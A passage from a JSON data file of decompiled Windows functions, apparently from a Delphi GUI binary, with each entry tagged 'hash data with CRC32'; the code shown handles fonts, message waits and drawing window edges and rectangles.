var_2ch._3_1_ = *(var_4h + 0x1e);\n        if ((var_2ch._3_1_ == '\\x01') && (*0x491b96 != '\\x01')) {\n            var_2ch._3_1_ = *0x491b96;\n        }\n        puStack112 = &stack0xfffffffc;\n        var_34h = var_38h;\n        fcn.00405794();\n        uVar2 = fcn.004059dc(*0x42496c);\n        fcn.00405794(0, uVar2);\n        uVar2 = fcn.004059dc();\n        iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n        if (iVar3 == 2) {\n            fcn.00405794();\n            fcn.0040a928();\n        }\n        else {\n            fcn.00405794();\n            fcn.0040a928();\n        }\n        if (((**0x494d14 == 1) && (cVar1 = fcn.0042b438(),  cVar1 == -0x80)) && (cVar1 = fcn.00424710(),  cVar1 != '\\0')\n           ) {\n            var_2ch._3_1_ = -0x80;\n        }\n        var_26h = 0;\n        if (var_34h == 0) {\n            var_28h = 0;\n        }\n        else {\n            var_28h = 7;\n        }\n        var_27h = 0;\n        cVar1 = fcn.00424ab4();\n        if (cVar1 == '\\x01') {\n            var_25h = 2;\n        }\n        else if (cVar1 == '\\x02') {\n            var_25h = 1;\n        }\n        else {\n            var_25h = 0;\n        }\n        puStackY148 = &fcn.0042473c::var_40h;\n        uVar2 = sub.gdi32.dll_CreateFontIndirectA();\n        *(var_4h + 8) = uVar2;\n    }\n    *in_FS_OFFSET = puStackY148;\n    fcn.00423a28(0x424937);\n    return;\n}\n",
        "token_count": 1144
    },
    "004257f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004257f0(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    param_2 = ~*(in_EAX + 2) & param_2;\n    if (*0x425864 != param_2) {\n        if ((param_2 & 1) != 0) {\n            (**(*in_EAX + 0x14))();\n            if (in_EAX[1] == 0) {\n                fcn.0040dbb8();\n                fcn.00404ec4();\n            }\n        }\n        if ((param_2 & 2) != 0) {\n            fcn.00425890();\n        }\n        if ((param_2 & 4) != 0) {\n            fcn.004258bc();\n        }\n        if ((param_2 & 8) != 0) {\n            fcn.004258ec();\n        }\n        *(in_EAX + 2) = param_2 | *(in_EAX + 2);\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "0042eb3c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042eb3c(uint32_t arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t *arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_20h;\n    int32_t var_4h;\n    \n    var_4h = fcn.0042ea7c();\n    if (var_4h == 0) {\n        uVar1 = sub.kernel32.dll_WaitForMultipleObjectsEx\n                          (arg_10h, arg_14h, -((arg_8h & 1) != 0), arg_ch, -((arg_8h & 2) != 0));\n    }\n    else {\n        while( true ) {\n            uVar1 = sub.user32.dll_MsgWaitForMultipleObjectsEx(arg_10h, arg_14h, arg_ch, 0xbf, arg_8h);\n            if (uVar1 != arg_10h) break;\n            iVar2 = sub.user32.dll_PeekMessageA();\n            if (iVar2 != 0) {\n                sub.user32.dll_TranslateMessage(&var_20h);\n                sub.user32.dll_DispatchMessageA();\n            }\n        }\n    }\n    if (uVar1 == 0x102) {\n        uVar3 = 0x8001011f;\n    }\n    else if (uVar1 == 0xc0) {\n        uVar3 = 0x80010115;\n    }\n    else {\n        uVar3 = 0;\n        if ((uVar1 < 0x80) || (arg_10h + 0x80 <= uVar1)) {\n            *arg_18h = uVar1;\n        }\n        else {\n            *arg_18h = uVar1 - 0x80;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 427
    },
    "00433ab4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nint16_t __fastcall fcn.00433ab4(uint param_1, uint8_t param_2)\n\n{\n    int16_t in_AX;\n    int16_t iVar1;\n    uint var_3h;\n    \n    var_3h._2_1_ = in_AX >> 8;\n    iVar1 = 0;\n    if (var_3h._2_1_ == '\\0') {\n        if ((param_2 & 1) != 0) {\n            in_AX = in_AX + 0x2000;\n        }\n        if ((param_2 & 4) != 0) {\n            in_AX = in_AX + 0x4000;\n        }\n        iVar1 = in_AX;\n        if ((param_2 & 2) != 0) {\n            iVar1 = in_AX + -0x8000;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 220
    },
    "00434d3c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434d3c(int32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x43567e;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*(lprc + -0x21) == '\\0') || (puVar2 = &stack0xfffffffc,  *(lprc + -0x22) == '\\0')) {\n        puVar2 = &stack0xfffffffc;\n        if (*(lprc + -0x21) == '\\0') goto code_r0x00434df8;\n        fcn.00432228();\n        cVar3 = fcn.00432330();\n        puVar2 = puStack24;\n        if (cVar3 == '\\0') goto code_r0x00434df8;\n    }\n    puStack24 = puVar2;\n    if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n        puVar2 = puStack24;\n        if (*(lprc + 8) != '\\0') {\n            fcn.00424fb8();\n            puVar2 = puStack24;\n        }\n    }\n    else {\n        fcn.00432228();\n        cVar3 = fcn.00432330();\n        if (cVar3 == '\\0') {\n            fcn.00424fb8();\n        }\n        else {\n            fcn.00424fb8();\n        }\n        fcn.004246fc();\n        puVar2 = puStack24;\n    }\ncode_r0x00434df8:\n    puStack24 = puVar2;\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x21) != '\\0')) {\n        fcn.0042535c();\n    }\n    if (*(lprc + -0x30) == 0) {\n        cVar3 = fcn.004047dc();\n        if (cVar3 == '\\0') {\n            *(lprc + -0x31) = 0;\n        }\n        else {\n            *(lprc + -0x31) = *(*(lprc + -0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc + -0x31) = 0;\n    }\n    *(lprc + -0x10) = *(lprc + -0x20) + 1;\n    iVar5 = *(lprc + -0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc + -0xc) = iVar5;\n    fcn.00405974();\n    if (bVar9) {\n        fcn.0042535c();\n        *(lprc + -0x10) = 0;\n        *(lprc + -8) = 0xfffffffc;\n        *(lprc + -0x39) = 0;\n    }\n    else {\n        if ((*(lprc + -0x40) == 0) ||\n           (((iVar5 = *(*(lprc + -0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.00448978(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc + -0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0')))\n             ))))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc + -0x41) = uVar4;\n        if ((*(lprc + -0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0'))))\n        {\n            if ((*(lprc + -0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc + -8) = *(lprc + -0x10);\n                *(lprc + -4) = *(lprc + -0xc);\n            }\n            else {\n                *(lprc + -8) = *(lprc + -0x10) + *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            *(lprc + -0x39) = 0;\n        }\n        else {\n            *(lprc + -0x39) = 1;\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -8) = *(lprc + -0x10) + 0x10;\n                *(lprc + -4) = *(lprc + -0xc) + 0x10;\n            }\n            else {\n                *(lprc + -8) = *(lprc + -0x10) + *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            if ((*(*(lprc + -0x38) + 0x38) != '\\0') && (*(lprc + -0x21) == '\\0')) {\n                *(lprc + -8) = *(lprc + -8) + 1;\n                *(lprc + -4) = *(lprc + -4) + 1;\n                uVar7 = fcn.00424fb0();\n                *(lprc + -0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.00424fb0();\n                    *(lprc + -0x48) = uVar7;\n                    fcn.0042b908();\n                    fcn.00424f8c();\n                    fcn.0042535c();\n                }\n                else {\n                    fcn.00424fb8();\n                    fcn.0042535c();\n                }\n                fcn.00424fb8();\n                *(lprc + -0x10) = *(lprc + -0x10) + 1;\n                *(lprc + -0xc) = *(lprc + -0xc) + 1;\n            }\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x5c) = *(lprc + -0x10);\n                *(lprc + -0x58) = *(lprc + -0xc);\n                *(lprc + -0x54) = *(lprc + -8);\n                *(lprc + -0x50) = *(lprc + -4);\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc + -8) - *(lprc + -0x10)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc + -8) - *(lprc + -0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0x10) = iVar5 + *(lprc + -0x10) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    *(lprc + -8) = iVar5 + *(lprc + -0x10);\n                }\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc + -4) - *(lprc + -0xc)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0xc) = iVar5 + *(lprc + -0xc) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    *(lprc + -4) = iVar5 + *(lprc + -0xc);\n                }\n                fcn.00425424();\n                *(lprc + -0x10) = *(lprc + -0x5c);\n                *(lprc + -0xc) = *(lprc + -0x58);\n                *(lprc + -8) = *(lprc + -0x54);\n                *(lprc + -4) = *(lprc + -0x50);\n            }\n            else {\n                iVar5 = *(*(lprc + -0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.00448978(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.004293dc();\n                    *(lprc + -0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc + -0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.0042a5c4();\n                    *(lprc + -0x48) = *(*(*(lprc + -0x28) + 0xc) + 0x18);\n                    fcn.004246fc();\n                    iVar5 = *(lprc + -0x4c);\n                    iVar6 = (**(**(lprc + -0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc + -0x4c) + 0x2c))(iVar6 + *(lprc + -0xc) + 1);\n                    fcn.004252b0(iVar5);\n                    fcn.004246fc();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00404650(0x4352dd);\n                    return;\n                }\n                fcn.00448c68(*(*(lprc + -0x38) + 0x39), *(*(lprc + -0x38) + 0x40), *(lprc + -0xc));\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -4) = *(lprc + -4) + -1;\n            }\n        }\n    }\n    *(lprc + -0x10) = *(lprc + -0x10) + -1;\n    *(lprc + -0xc) = *(lprc + -0xc) + -1;\n    *(lprc + -8) = *(lprc + -8) + 2;\n    *(lprc + -4) = *(lprc + -4) + 2;\n    if (((*(*(lprc + -0x38) + 0x38) != '\\0') || ((*(lprc + -0x29) != '\\0' && (*(lprc + -0x39) != '\\0')))) &&\n       (*(lprc + -0x21) == '\\0')) {\n        uVar7 = fcn.00425714();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc + -0x29) != '\\0') {\n        if (*(lprc + -0x39) != '\\0') {\n            *(lprc + -0x20) = *(lprc + -8) + 1;\n        }\n        if ((*(lprc + -0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.00424fb8();\n        }\n        fcn.0042535c();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x5d) != '\\0')) && ((*(lprc + -0x21) == '\\0' || (*(lprc + -0x22) == '\\0')))\n       ) {\n        if (*(lprc + -0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.00425714();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.00425714();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc + -0x29) == '\\0') {\n            iStack32 = lprc + -0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x39) == '\\0')) {\n        *(lprc + -0x20) = *(lprc + -8) + 1;\n    }\n    *(lprc + -0x20) = *(lprc + -0x20) + 2;\n    *(lprc + -0x18) = *(lprc + -0x18) + -1;\n    *(lprc + -100) = *(*(lprc + -0x31) * 2 + 0x4924d0) | 0x60;\n    if ((*(lprc + -0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc + -100) = *(lprc + -100) | 0x100000;\n    }\n    *(lprc + -0x5c) = *(lprc + -0x20);\n    *(lprc + -0x58) = *(lprc + -0x1c);\n    *(lprc + -0x54) = *(lprc + -0x18);\n    *(lprc + -0x50) = *(lprc + -0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.00424a88();\n    }\n    fcn.00434ae4(*(lprc + -100) | 0x500, *(lprc + -0x29), lprc + -0x20);\n    uVar8 = (*(lprc + -0x50) - *(lprc + -0x58)) - (*(lprc + -0x14) - *(lprc + -0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc + -0x20, 0, iVar5);\n    if ((((*(lprc + 8) != '\\0') && (*(lprc + -0x29) != '\\0')) && (*(lprc + -0x5d) != '\\0')) && (*(lprc + -0x21) == '\\0')\n       ) {\n        sub.user32.dll_OffsetRect(lprc + -0x20, 1, 0);\n    }\n    fcn.00434ae4(*(lprc + -100), *(lprc + -0x29), lprc + -0x20);\n    if ((*(*(lprc + -0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        *(lprc + -0x20) = *(lprc + -0x18);\n        *(lprc + -0x18) = *(lprc + -0x54) + -10;\n        iVar5 = lprc + -0x20;\n        uVar8 = *(lprc + -0x29);\n        in_stack_ffffffa4 = 2;\n        fcn.00433b40();\n        fcn.00434ae4(in_stack_ffffffa4, uVar8, iVar5);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.00405530(0x435685);\n    return;\n}\n",
        "token_count": 4177
    },
    "0043569c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043569c(int32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x435ffe;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*(lprc + -0x21) == '\\0') || (puVar2 = &stack0xfffffffc,  *(lprc + -0x22) == '\\0')) {\n        puVar2 = &stack0xfffffffc;\n        if (*(lprc + -0x21) == '\\0') goto code_r0x00435758;\n        fcn.00432228();\n        cVar3 = fcn.00432330();\n        puVar2 = puStack24;\n        if (cVar3 == '\\0') goto code_r0x00435758;\n    }\n    puStack24 = puVar2;\n    if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n        puVar2 = puStack24;\n        if (*(lprc + 8) != '\\0') {\n            fcn.00424fb8();\n            puVar2 = puStack24;\n        }\n    }\n    else {\n        fcn.00432228();\n        cVar3 = fcn.00432330();\n        if (cVar3 == '\\0') {\n            fcn.00424fb8();\n        }\n        else {\n            fcn.00424fb8();\n        }\n        fcn.004246fc();\n        puVar2 = puStack24;\n    }\ncode_r0x00435758:\n    puStack24 = puVar2;\n    if ((*(lprc + -0x29) == '\\0') || ((*(lprc + -0x21) != '\\0' && (*(*(lprc + -0x38) + 0x38) == '\\0')))) {\n        fcn.0042535c();\n    }\n    if (*(lprc + -0x30) == 0) {\n        cVar3 = fcn.004047dc();\n        if (cVar3 == '\\0') {\n            *(lprc + -0x31) = 0;\n        }\n        else {\n            *(lprc + -0x31) = *(*(lprc + -0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc + -0x31) = 0;\n    }\n    *(lprc + -8) = *(lprc + -0x18) + -1;\n    iVar5 = *(lprc + -0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc + -0xc) = iVar5;\n    fcn.00405974();\n    if (bVar9) {\n        fcn.0042535c();\n        *(lprc + -0x10) = *(lprc + -8) + 2;\n        *(lprc + -8) = 0;\n        *(lprc + -0x39) = 0;\n    }\n    else {\n        if ((*(lprc + -0x40) == 0) ||\n           (((iVar5 = *(*(lprc + -0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.00448978(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc + -0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0')))\n             ))))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc + -0x41) = uVar4;\n        if ((*(lprc + -0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0'))))\n        {\n            if ((*(lprc + -0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc + -0x10) = *(lprc + -8);\n                *(lprc + -4) = *(lprc + -0xc);\n            }\n            else {\n                *(lprc + -0x10) = *(lprc + -8) - *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            *(lprc + -0x39) = 0;\n        }\n        else {\n            *(lprc + -0x39) = 1;\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x10) = *(lprc + -8) + -0x10;\n                *(lprc + -4) = *(lprc + -0xc) + 0x10;\n            }\n            else {\n                *(lprc + -0x10) = *(lprc + -8) - *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -0x10) = *(lprc + -0x10) + -1;\n                *(lprc + -4) = *(lprc + -4) + 1;\n                uVar7 = fcn.00424fb0();\n                *(lprc + -0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.00424fb0();\n                    *(lprc + -0x48) = uVar7;\n                    fcn.0042b908();\n                    fcn.00424f8c();\n                    fcn.0042535c();\n                }\n                else {\n                    fcn.00424fb8();\n                    fcn.0042535c();\n                }\n                fcn.00424fb8();\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -0xc) = *(lprc + -0xc) + 1;\n            }\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x5c) = *(lprc + -0x10);\n                *(lprc + -0x58) = *(lprc + -0xc);\n                *(lprc + -0x54) = *(lprc + -8);\n                *(lprc + -0x50) = *(lprc + -4);\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc + -8) - *(lprc + -0x10)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc + -8) - *(lprc + -0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -8) = (*(lprc + -8) - iVar5) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    *(lprc + -0x10) = *(lprc + -8) - iVar5;\n                }\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc + -4) - *(lprc + -0xc)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0xc) = iVar5 + *(lprc + -0xc) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    *(lprc + -4) = iVar5 + *(lprc + -0xc);\n                }\n                fcn.00425424();\n                *(lprc + -0x10) = *(lprc + -0x5c);\n                *(lprc + -0xc) = *(lprc + -0x58);\n                *(lprc + -8) = *(lprc + -0x54);\n                *(lprc + -4) = *(lprc + -0x50);\n            }\n            else {\n                iVar5 = *(*(lprc + -0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.00448978(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.004293dc();\n                    *(lprc + -0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc + -0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.0042a5c4();\n                    *(lprc + -0x48) = *(*(*(lprc + -0x28) + 0xc) + 0x18);\n                    fcn.004246fc();\n                    iVar5 = *(lprc + -0x4c);\n                    iVar6 = (**(**(lprc + -0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc + -0x4c) + 0x2c))(iVar6 + *(lprc + -0xc) + 1);\n                    fcn.004252b0(iVar5);\n                    fcn.004246fc();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00404650(0x435c45);\n                    return;\n                }\n                fcn.00448c68(*(*(lprc + -0x38) + 0x39), *(*(lprc + -0x38) + 0x40), *(lprc + -0xc));\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -4) = *(lprc + -4) + -1;\n            }\n        }\n    }\n    *(lprc + -0x10) = *(lprc + -0x10) + -1;\n    *(lprc + -0xc) = *(lprc + -0xc) + -1;\n    *(lprc + -8) = *(lprc + -8) + 2;\n    *(lprc + -4) = *(lprc + -4) + 2;\n    if ((*(*(lprc + -0x38) + 0x38) != '\\0') ||\n       (((*(lprc + -0x29) != '\\0' && (*(lprc + -0x39) != '\\0')) && (*(lprc + -0x21) == '\\0')))) {\n        uVar7 = fcn.00425714();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc + -0x29) != '\\0') {\n        if (*(lprc + -0x39) != '\\0') {\n            *(lprc + -0x18) = *(lprc + -0x10) + -1;\n        }\n        if ((*(lprc + -0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.00424fb8();\n        }\n        fcn.0042535c();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x5d) != '\\0')) && ((*(lprc + -0x21) == '\\0' || (*(lprc + -0x22) == '\\0')))\n       ) {\n        if (*(lprc + -0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.00425714();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.00425714();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc + -0x29) == '\\0') {\n            iStack32 = lprc + -0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x39) == '\\0')) {\n        *(lprc + -0x18) = *(lprc + -0x10) + -1;\n    }\n    *(lprc + -0x20) = *(lprc + -0x20) + 2;\n    *(lprc + -0x18) = *(lprc + -0x18) + -1;\n    *(lprc + -100) = *(*(lprc + -0x31) * 2 + 0x4924d0) | 0x60;\n    if ((*(lprc + -0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc + -100) = *(lprc + -100) | 0x100000;\n    }\n    *(lprc + -0x5c) = *(lprc + -0x20);\n    *(lprc + -0x58) = *(lprc + -0x1c);\n    *(lprc + -0x54) = *(lprc + -0x18);\n    *(lprc + -0x50) = *(lprc + -0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.00424a88();\n    }\n    fcn.00434ae4(*(lprc + -100) | 0x500, *(lprc + -0x29), lprc + -0x20);\n    *(lprc + -0x20) = *(lprc + -0x5c);\n    *(lprc + -0x18) = *(lprc + -0x54);\n    uVar8 = (*(lprc + -0x50) - *(lprc + -0x58)) - (*(lprc + -0x14) - *(lprc + -0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc + -0x20, 0, iVar5);\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x29) != '\\0')) && (*(lprc + -0x5d) != '\\0')) {\n        sub.user32.dll_OffsetRect(lprc + -0x20, 1, 0);\n    }\n    fcn.00434ae4(*(lprc + -100), *(lprc + -0x29), lprc + -0x20);\n    if ((*(*(lprc + -0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        fcn.00433b40();\n        *(lprc + -0x20) = 10;\n        iVar5 = fcn.00425570();\n        *(lprc + -0x18) = iVar5 + *(lprc + -0x20);\n        in_stack_ffffffa4 = 2;\n        fcn.00434ae4(2, *(lprc + -0x29), lprc + -0x20);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.00405530(0x436005);\n    return;\n}\n",
        "token_count": 4198
    },
    "0043601c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043601c(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_ECX;\n    uint var_65h;\n    uint var_5dh;\n    uint var_40h;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    var_20h = *in_ECX;\n    uStack32 = in_ECX[1];\n    uStack28 = in_ECX[2];\n    uStack24 = in_ECX[3];\n    iVar2 = fcn.00436b60();\n    iVar3 = fcn.00436174();\n    cVar1 = fcn.0040e384();\n    if ((cVar1 != '\\0') && (iVar4 = fcn.00432228(),  *(iVar4 + 5) != '\\0')) {\n        (***0x4948e8)(0, 0x3e9);\n    }\n    if (((iVar2 == 0) || ((*(iVar2 + 0x40) == '\\0' && (iVar3 == 0)))) ||\n       ((*(in_EAX + 0x9a) == 0 && (*(in_EAX + 0x92) == 0)))) {\n        if ((iVar2 == 0) || (cVar1 = fcn.004383e0(),  cVar1 != '\\0')) {\n            fcn.0043569c(&stack0xfffffffc);\n        }\n        else {\n            fcn.00434d3c(&stack0xfffffffc);\n        }\n    }\n    else {\n        (**(*in_EAX + 0x34))((arg_ch & 1) != 0);\n        if (*(in_EAX + 0x9a) != 0) {\n            (*in_EAX[0x26])(arg_ch, &var_20h);\n        }\n    }\n    return;\n}\n",
        "token_count": 475
    },
    "00436a28": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
